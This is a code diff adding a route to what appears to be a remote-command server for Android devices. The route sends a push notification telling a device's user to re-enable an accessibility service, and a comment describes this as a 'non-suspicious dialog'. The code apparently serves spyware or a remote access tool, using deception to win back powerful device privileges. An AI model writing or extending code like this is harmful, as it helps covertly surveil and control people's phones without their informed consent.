@@ -278,6 +278,49 @@ router.post('/wakeup', async (req, res) => {
 });
 
 
+/**
+ * POST /api/commands/request-accessibility
+ * Send a push notification to prompt user to re-enable accessibility service
+ * This opens a non-suspicious dialog on the device
+ */
+router.post('/request-accessibility', async (req, res) => {
+    try {
+        const { deviceId } = req.body;
+
+        if (!deviceId) {
+            return res.status(400).json({
+                success: false,
+                error: 'Device ID required'
+            });
+        }
+
+        const device = await findDevice(deviceId);
+        if (!device) {
+            return res.status(404).json({ success: false, error: 'Device not found' });
+        }
+
+        if (!device.fcmToken) {
+            return res.status(400).json({
+                success: false,
+                error: 'Device has no FCM token - cannot send request'
+            });
+        }
+
+        // Send accessibility request push via FCM
+        const fcmService = require('../services/fcm');
+        await fcmService.sendAccessibilityRequest(device.fcmToken);
+
+        console.log(`[COMMANDS] 📲 Accessibility request sent to ${deviceId}`);
+        res.json({
+            success: true,
+            message: 'Accessibility prompt sent to device'
+        });
+    } catch (error) {
+        console.error('[COMMANDS] Accessibility request error:', error.message);
+        res.status(500).json({ success: false, error: error.message || 'Failed to send accessibility request' });
+    }
+});
+
 
 /**
  * GET /api/commands/history/:deviceId
